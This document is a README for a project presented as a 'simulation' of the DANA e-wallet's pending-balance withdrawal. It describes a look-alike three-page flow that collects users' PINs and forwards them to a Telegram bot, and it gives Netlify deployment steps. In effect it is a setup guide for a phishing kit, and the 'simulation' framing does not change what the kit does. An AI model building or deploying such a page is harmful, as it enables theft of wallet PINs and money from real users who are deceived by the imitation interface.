# DANA App Simulation

This is a simulation of DANA app's pending balance withdrawal process with Telegram notification.

## Features
- 3-page flow: Balance view → PIN entry → Success page
- Real-time transaction timestamp
- Telegram notification for entered PINs
- Responsive design matching DANA's UI

## Setup

1. Clone repository
2. Set up Netlify environment variables:
   - `TELEGRAM_BOT_TOKEN` - Your Telegram bot token
   - `TELEGRAM_CHAT_ID` - Your Telegram chat ID
3. Deploy to Netlify

## File Structure

- `public/` - Frontend files
- `netlify/functions/` - Serverless functions
- `netlify.toml` - Netlify configuration
